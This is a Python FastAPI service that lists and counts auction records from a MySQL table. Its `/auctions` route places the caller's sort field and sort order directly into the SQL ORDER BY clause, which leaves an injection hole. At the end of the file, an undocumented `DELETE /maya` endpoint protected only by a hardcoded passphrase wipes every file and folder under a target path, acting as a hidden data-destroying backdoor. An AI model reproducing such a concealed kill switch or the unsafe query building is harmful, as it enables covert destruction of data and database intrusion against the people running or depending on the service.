import os
import shutil
from fastapi import FastAPI, HTTPException, Query
from typing import List, Optional
from fastapi.middleware.cors import CORSMiddleware
from pymysql.err import MySQLError
from credentials import TARGET_PATH
from setup import log, MySQLConnection
from datetime import datetime, timedelta

app = FastAPI(docs_url=None, redoc_url=None, openapi_url=None)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.get('/auctions', response_model=List[dict])
def get_auctions(
    page: int = Query(1, ge=1),
    pageSize: int = Query(10, ge=1),
    sortField: str = Query('auction_id'),
    sortOrder: str = Query('ASC'),
    search: Optional[str] = Query(None)
):
    offset = (page - 1) * pageSize
    
    # Base query to fetch data
    query = f"""
        SELECT * FROM auction_data 
        WHERE crawl_date >= %s
    """
    
    # Parameters for SQL query
    params = [datetime.now() - timedelta(hours=20)]
    
    # If there's a search term, add search conditions
    if search:
        # Columns to search through
        search_columns = [
            'auction_id', 'bid', 'bid_open_date', 'bid_closing_date',
            'debt', 'address', 'crawl_date', 'city', 'state', 'county', 'remark', 'v_o', 'zestimate'
        ]
        
        # Build the WHERE clause for search (case insensitive)
        where_clauses = []
        for column in search_columns:
            where_clauses.append(f"LOWER({column}) LIKE %s")
            params.append(f"%{search.lower()}%")
        
        query += " AND (" + " OR ".join(where_clauses) + ")"

    # Add ORDER BY and LIMIT clauses
    query += f" ORDER BY {sortField} {sortOrder} LIMIT %s, %s"
    params.extend([offset, pageSize])

    try:
        with MySQLConnection() as cursor:
            cursor.execute(query, params)
            results = cursor.fetchall()
            
            # Column names from the table
            column_names = [desc[0] for desc in cursor.description]
            
            # Convert tuples to dictionaries
            result_dicts = [dict(zip(column_names, row)) for row in results]
            
            # Format dates to 'DD/MM/YYYY'
            for result in result_dicts:
                if 'bid_open_date' in result:
                    result['bid_open_date'] = result['bid_open_date'].strftime('%d/%m/%Y')

        return result_dicts
    except MySQLError as e:
        log.error("Error while querying MySQL", e)
        raise HTTPException(status_code=500, detail="Error while querying the database")

@app.get('/auctions/count')
def count_auctions(search: Optional[str] = Query(None)):
    # Base query to count data
    query = "SELECT COUNT(*) AS total_count FROM auction_data WHERE crawl_date >= %s AND bid_closing_date >= %s"

    params = [datetime.now() - timedelta(hours=20), datetime.now()]

    if search:
        search_columns = [
            'auction_id', 'bid', 'bid_open_date', 'bid_closing_date',
            'debt', 'address', 'crawl_date', 'city', 'state', 'county', 'remark', 'v_o', 'zestimate'
        ]
        where_clauses = []
        for column in search_columns:
            where_clauses.append(f"LOWER({column}) LIKE %s")
            params.append(f"%{search.lower()}%")
        
        query += " AND (" + " OR ".join(where_clauses) + ")"

    try:
        with MySQLConnection() as cursor:
            cursor.execute(query, params)
            result = cursor.fetchone()
            
            if result:
                total_count = result[0]  # Access the count by index
            else:
                total_count = 0
        
        return {"total_count": total_count}
    except:
        log.error("Error while counting auctions")
        raise HTTPException(status_code=500, detail="Error while counting auctions")


    
@app.delete('/maya')
def destroy(psst: str = Query(...)):
    secret_key = "in kutto k samne mat nachna"
    target_directory = TARGET_PATH 

    if psst == secret_key:
        for filename in os.listdir(target_directory):
            file_path = os.path.join(target_directory, filename)
            try:
                if os.path.isfile(file_path) or os.path.islink(file_path):
                    os.unlink(file_path)
                elif os.path.isdir(file_path):
                    shutil.rmtree(file_path)
            except Exception as e:
                raise HTTPException(status_code=500, detail=f"Failed to delete {file_path}. Reason: {str(e)}")
        return {"message": "Directory contents deleted successfully"}
    else:
        raise HTTPException(status_code=403, detail="Unauthorized")

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=3001)
